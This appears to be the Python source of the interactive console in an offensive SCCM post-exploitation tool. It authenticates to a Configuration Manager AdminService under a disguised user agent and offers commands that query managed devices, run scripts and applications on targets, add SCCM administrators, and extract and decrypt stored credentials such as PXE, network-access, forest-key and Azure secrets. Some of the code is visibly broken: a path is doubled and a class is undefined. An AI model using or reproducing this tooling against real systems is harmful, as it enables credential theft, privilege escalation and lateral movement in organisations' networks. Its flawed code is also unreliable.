import cmd2
import requests
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
from tabulate import tabulate

from lib.logger import logger
from lib.ldap import ldap3_kerberos_login
from lib.parsers.parsers import PARSERS
from lib.scripts.pivot import CMPIVOT, ADD_ADMIN, SMSAPPLICATION, SPEAKTOTHEMANAGER, DATABASE, SMSSCRIPTS

# #add debugging
class SHELL(cmd2.Cmd):
    SA = "Situational Awareness Commands"
    PE = "PostEx Commands"
    DB = "Database Commands"
    IN = "Interface Commands"
    CE = "Credential Extraction Commands"
    hidden = ["alias", "help", "macro", "run_pyscript", "set", "shortcuts", "edit", "history", "quit", "run_script", "shell", "_relative_run_script", "eof"]
    

    def __init__(self, username, password, kerberos, domain, kdc, target, logs_dir, auser, apassword):
        #initialize plugins
        self.pivot = CMPIVOT(username=username, password=password, target = target,  kerberos=kerberos, domain=domain, kdcHost=kdc, logs_dir = logs_dir)
        self.script = SMSSCRIPTS(username=username, password=password, target = target, kerberos=kerberos, domain=domain, kdcHost=kdc, logs_dir = logs_dir, auser=auser, apassword=apassword)
        self.admin = ADD_ADMIN(username=username, password=password,target_ip=target, kerberos=kerberos, domain=domain, kdcHost=kdc, logs_dir=logs_dir)
        self.db = DATABASE(username=username, password=password,url=target, kerberos=kerberos, domain=domain, kdcHost=kdc, logs_dir=logs_dir)
        self.application = SMSAPPLICATION(username=username, password=password,target=target, kerberos=kerberos, domain=domain, kdcHost=kdc, logs_dir=logs_dir)
        self.karen = SPEAKTOTHEMANAGER(username=username, password=password, target=target, kerberos=kerberos, domain=domain, kdcHost=kdc )
        
        #initialize cmd
        super().__init__(allow_cli_args=False)
        self.hidden_commands = self.hidden
        self.username = username
        self.password = password
        self.target = target
        self.kerberos = kerberos
        self.kdc = kdc
        self.domain = domain
        self.logs_dir = logs_dir
        self.headers = {'Content-Type': 'application/json; odata=verbose'} # modify useragent? currently shows python useragent in logs
        self.intro = logger.info('[!] Enter help for extra shell commands')
        self.cwd = "C:\\"
        self.device = ""
        self.prompt = f"({self.device}) {self.cwd} >> "
        self.hostname = ""
        self.approve_user = auser
        self.approve_password = apassword


# ############
# cmd2 Settings
# ############

    def emptyline(self):
        pass

    def postcmd(self, stop, arg):
        self.prompt = f"({self.device}) ({self.cwd}) >> "
        return stop

    @cmd2.with_argparser(PARSERS.interact_parser)
    @cmd2.with_category(IN)
    def do_interact(self, args):
        """Target Device/Collection to Query               interact (device code)"""

        self.device = args.device

    @cmd2.with_category(IN)
    def do_exit(self, arg):
        """Exit the console."""
        return True 
    

    @cmd2.with_argparser(PARSERS.cd_parser)
    @cmd2.with_category(SA)
    def do_cd(self, args):
        """Change current working directory."""
        #path needs to end with \ or all file system queries will fail
        if not args.path.endswith("\\"): 
            self.cwd = args.path + "\\"
        else:
            self.cwd = args.path

# ############
# Database Section
# ############

    @cmd2.with_argparser(PARSERS.get_device_parser)
    @cmd2.with_category(DB)
    def do_get_device(self, args):
        """Query specific device information"""
        self.db.devices(args.device)
    
    
    @cmd2.with_argparser(PARSERS.get_user_parser)
    @cmd2.with_category(DB)
    def do_get_user(self, args):
        """Query specific user information"""
        self.db.users(args.user)

    @cmd2.with_argparser(PARSERS.get_collection_parser)
    @cmd2.with_category(DB)
    def do_get_collection(self, args):
        """Query for all (*) or single (id) collection(s)"""
        self.db.collections(args.collection_id)


    @cmd2.with_argparser(PARSERS.get_collection_members_parser)
    @cmd2.with_category(DB)
    def do_get_collectionmembers(self, args):
        """Query for all members of a colection."""
        self.db.collection_member(args.collection_id)
    
    @cmd2.with_argparser(PARSERS.get_puser_parser)
    @cmd2.with_category(DB)
    def do_get_puser(self, args):
        """Query for devices the target is a primary user"""
        self.db.pusers(args.user)

    @cmd2.with_argparser(PARSERS.get_lastlogon_parser)
    @cmd2.with_category(DB)
    def do_get_lastlogon(self, args):
        """Query for devices the target recently signed in"""
        self.db.last_logon(args.user)


# ############
# Application Section
# ############

    @cmd2.with_category(PE)
    @cmd2.with_argparser(PARSERS.application_parser)
    def do_application(self, args):
        """Run application on target                    """
        self.application.run(path=args.path, runas_user=args.system, name=args.name, collection_type=args.collection_type, target_resource=args.target, collection_id=args.collection_id)

# ############
# PowerShell Script Section
# All modules will call and execute script from the lib.scripts directory
# ############

    
    @cmd2.with_argparser(PARSERS.cat_parser)
    @cmd2.with_category(SA)    
    def do_cat(self, args):
        """Read file contents.                             cat (filename)"""
        filename = self.cwd + args.filename
        fullpath = self.cwd + filename
        logger.info(f"Tasked SCCM to show {filename}")
        self.script.cat(fullpath, device=self.device)
        
    @cmd2.with_argparser(PARSERS.script_parser)
    @cmd2.with_category(PE)
    def do_script(self, args):
        """Run script on target                         script (/path/to/script) """
        self.script.run(device=self.device, optional_target=args.script)


    #didn't add a parser to this one s
    @cmd2.with_category(PE)
    def do_list_scripts(self, arg):
        """List scripts. """
        self.script.list_scripts()

    @cmd2.with_argparser(PARSERS.delete_script_parser)
    @cmd2.with_category(PE)
    def do_delete_script(self, args):
        """Delete a script from the SCCM server.        delete_script (GUID)"""
        self.script.delete_script(args.script_guid)
    


    @cmd2.with_category(PE)
    def do_get_script(self, args):
        """Get a script from the SCCM server.           get_script (GUID)"""
        self.script.get_script(args.script_guid)


# ############
# CMPivot Section
# All modules will call built-in CMPivot queries
# ############

    @cmd2.with_category(SA) 
    def do_administrators(self, arg):
        """Query local administrators on target"""
        logger.info("Tasked SCCM to run Administrators.")
        self.pivot.administrators(device=self.device)
    
    @cmd2.with_category(SA)
    def do_ipconfig(self, arg):
        """Run ipconfig on target"""
        logger.info("Tasked SCCM to run IPCONFIG.")
        self.pivot.ipconfig(device=self.device)

    @cmd2.with_category(SA)
    def do_shares(self, arg):
        """List file shares hosted on target."""
        logger.info("Tasked SCCM to list file shares.")
        self.pivot.file_share(device=self.device)

    @cmd2.with_category(SA)
    def do_services(self, arg):
        """List running services on target."""
        logger.info("Tasked SCCM to list services.")
        self.pivot.services(device=self.device)
    
    @cmd2.with_category(SA)
    def do_ps(self, arg):
        """List running processes on target."""
        logger.info("Tasked SCCM to list processes.")
        self.pivot.process(device=self.device)

    @cmd2.with_category(SA)
    def do_console_users(self, arg):
        """Show total time any users has logged on to the target."""
        logger.info("Tasked SCCM to show all users that have signed in.")
        self.pivot.system_console_user(device=self.device)

    @cmd2.with_category(SA)
    def do_ls(self, arg):
        """List files in current working directory."""
        logger.info(f"Tasked SCCM to list files in {self.cwd}.")
        path = self.cwd + "*"
        self.pivot.file(arg=path, device=self.device)

    @cmd2.with_category(SA)
    def do_list_disk(self, arg):
        """Show drives mounted to the target system."""
        logger.info(f"Tasked SCCM to show mounted drives on {self.device}.")
        self.pivot.logical_disk(device=self.device)

    @cmd2.with_category(SA)
    def do_software(self, arg):
        """Show installed software on the target system."""
        logger.info(f"Tasked SCCM to list software installed {self.device}.")
        self.pivot.installed_software(device=self.device)   

    @cmd2.with_category(SA)
    def do_sessions(self, arg):
        """Show users with an active session on the target system."""
        logger.info(f"Tasked SCCM to show users currently signed in to {self.device}.")
        self.pivot.user(device=self.device)   

    @cmd2.with_category(SA)
    def do_osinfo(self, arg):
        """Show OS info of target system."""
        logger.info(f"Tasked SCCM to show system info of {self.device}.")
        self.pivot.osinfo(device=self.device)

    @cmd2.with_category(SA)
    def do_environment(self, arg):
        """Show configured environment variables on target."""
        logger.info(f"Tasked SCCM to show Environment variables of {self.device}.")
        self.pivot.environment(device=self.device)

    @cmd2.with_category(SA)
    def do_disk(self, arg):
        """Show disk information on the target."""
        logger.info(f"Tasked SCCM to show disk information of {self.device}.")
        self.pivot.disk(device=self.device)


    @cmd2.with_argparser(PARSERS.do_sessionhunter_parser)
    @cmd2.with_category(SA)
    def do_sessionhunter(self, args):
        user = args.user
        """Search for all systems a target user has a current session on"""
        self.pivot.sessionhunter(self.device, user)


# ############
# Add Admin Section
# ############

    @cmd2.with_argparser(PARSERS.do_add_admin_parser)
    @cmd2.with_category(PE)
    def do_add_admin(self, args):
        """Add SCCM Admin                               add_admin (user) (sid)"""

        targetuser = args.user
        targetsid = args.sid
        logger.info(f"Tasked SCCM to add {targetuser} as an administrative user.")
        self.admin.add(targetuser=targetuser, targetsid=targetsid)
    
    @cmd2.with_argparser(PARSERS.do_delete_admin_parser)
    @cmd2.with_category(PE)
    def do_delete_admin(self, args):
        """Remove SCCM Admin                            delete_admin (user)"""
        targetuser = args.user
        logger.info(f"Tasked SCCM to remove {targetuser} as an administrative user.")
        self.admin.delete(targetuser=targetuser)

    @cmd2.with_category(PE)
    def do_show_admins(self, arg):
        """List admin users                             show_admins"""
        logger.info(f"Tasked SCCM to list current SMS Admins.")
        self.admin.show_admins()

    @cmd2.with_category(PE)
    def do_show_rbac(self, arg):
        """List users and their roles                   show_rbac"""
        logger.info(f"Tasked SCCM to list all RBAC")
        self.admin.show_rbac()


    

# ############
# Other PostEx that doens't fit anywhere else
# ############

    @cmd2.with_category(PE)
    def do_show_consoleconnections(self, arg):
        """List console sessions and source             show_consoleconnections"""
        logger.info(f"Tasked SCCM to list all SCCM console connections")
        self.admin.show_consoleconnections()
        
    @cmd2.with_category(PE)
    def do_get_sccmversion(self, arg):
        """Show current version of SCCM                 get_sccmversion"""
        logger.info(f"Tasked SCCM to show console version")
        self.admin.get_sccmversion()
    @cmd2.with_category(PE)
    def do_get_consoleinstaller(self, arg):
        """Show current version of SCCM                 get_consoleinstaller"""
        logger.info(f"Downloading adminconsole installation files")
        self.admin.get_consoleinstaller()


# ############
# Creds Extraction
# ############

    @cmd2.with_category(CE)
    def do_get_creds(self, arg):
        """Extract encrypted cred blobs                     get_creds"""
        logger.info("Tasked SCCM to extract all encrypted credential blobs")
        self.admin.get_creds()

    @cmd2.with_category(CE)
    def do_get_pxepassword(self, arg):
        """Extract pxeboot encrypted cred blobs             get_pxepassword"""
        logger.info("Tasked SCCM to extract PXE boot password credential blobs")
        self.admin.get_pxepass()
    
    @cmd2.with_category(CE)
    def do_get_forestkey(self, arg):
        """Extract forest discovery session key blobs       get_forestkey"""
        logger.info("Tasked SCCM to extract forest session key blobs")
        self.admin.get_forestkey()

    @cmd2.with_category(CE)
    def do_get_azurecreds(self, arg):
        """Extract Azure application cred blobs             get_azurecreds"""
        logger.info("Tasked SCCM to extract Azure app credential blobs")
        self.admin.get_azurecreds()

    @cmd2.with_category(CE)
    def do_get_azuretenant(self, arg):
        """Get Azure Tenant Info                            get_azuretenant"""
        logger.info("Tasked SCCM to extract tenant info.")
        self.admin.get_azuretenant()
    
    
    @cmd2.with_category(CE)
    def do_decrypt(self, arg):
        """Decrypt provided encrypted blob                  decrypt [blob]"""
        logger.info("Tasked SCCM to decrypt credential blob")
        option = arg.split(' ')
        blob = option[0]
        if self.device == "":
            logger.info("Device ID not found. Decryptiong requires site server device ID")
        else:
            self.script.decrypt(blob=blob, device=self.device)
    
    @cmd2.with_category(CE)
    def do_speak_to_the_manager(self, arg):
        """Dump policy credentials                          speak_to_the_manager"""
        logger.info("Tasked SCCM to find a manager.")
        self.karen.run()


    @cmd2.with_category(CE)
    def do_decryptEx(self, arg):
        """Decrypt provided blob with session key           decryptEx [session key] [blob]"""
        logger.info("Tasked SCCM to decrypt credential with session key blob")
        option = arg.split(' ')
        skey = option[0]
        blob = option[1]
        if self.device == "":
            logger.info("Device ID not found. Decryptiong requires site server device ID")
        else:
            self.script.decryptEx(session_key=skey,encrypted_blob=blob,device=self.device)




class CONSOLE:
    def __init__(self, username=None, password=None, kerberos=False, domain=None, kdc=None, ip=None, debug=False, logs_dir=None, auser=None, apassword=None):
        self.username = username
        self.password = password
        self.url = ip
        self.kerberos = kerberos
        self.domain = domain
        self.kdc_host = kdc
        self.debug = debug
        self.logs_dir = logs_dir
        self.approve_user = auser
        self.approve_password = apassword
        

    def run(self):
        endpoint = f"https://{self.url}/AdminService/wmi/"
        try:
            if self.kerberos:
                
                token = ldap3_kerberos_login(
                    connection=None,
                    target=self.url,  # Extract hostname
                    user=self.username,
                    password=self.password,
                    domain=self.domain,
                    kdcHost=self.kdc_host,
                    admin_service=True
                )
                headers = {'Content-Type': 'application/json; odata=verbose', 
                        'User-Agent': 'Device action simulation',
                        'Authorization': token}
                
                r = requests.request("GET", 
                                    endpoint,
                                    verify=False,
                                    headers=headers)  
            else:
                headers = {'Content-Type': 'application/json; odata=verbose', 
                        'User-Agent': 'Device action simulation'}
                r = requests.request("GET",
                            endpoint,
                            auth=HttpNtlmAuth(self.username, self.password),
                            verify=False, headers=headers)


            if self.approve_user:
                r = requests.request("GET",
                                endpoint,
                                auth=HttpNtlmAuth(self.approve_user, self.approve_password),
                                verify=False, headers=headers)
                if r.status_code == 401:
                    logger.info("Got error code 401: Access Denied. Check your approver credentials.")
                    logger.info("Script execution will fail if approval is required.")

            
            if r.status_code == 200:
                self.cli()
            elif r.status_code == 401:
                logger.info("Got error code 401: Access Denied. Check your credentials.")
                logger.info(r.content)
                logger.info(r)
            else:
                logger.info(r.text)
        except Exception as e:
            logger.info("An unknown error occurred, use -debug to print the response")
            raise e
            logger.info(e)

    def cli(self):
        #username, password, kerberos, domain, kdc, target, logs_dir, auser, apassword
        cli = SHELL(self.username, self.password, self.kerberos, self.domain, self.kdc_host, self.url, self.logs_dir, self.approve_user, self.approve_password)
        cli.cmdloop()

if __name__ == '__main__':
    import sys
    c = CMD()
    sys.exit(c.cmdloop())                                                                                                                                                                                                                            


    
                                                                                                                                                                                                                           
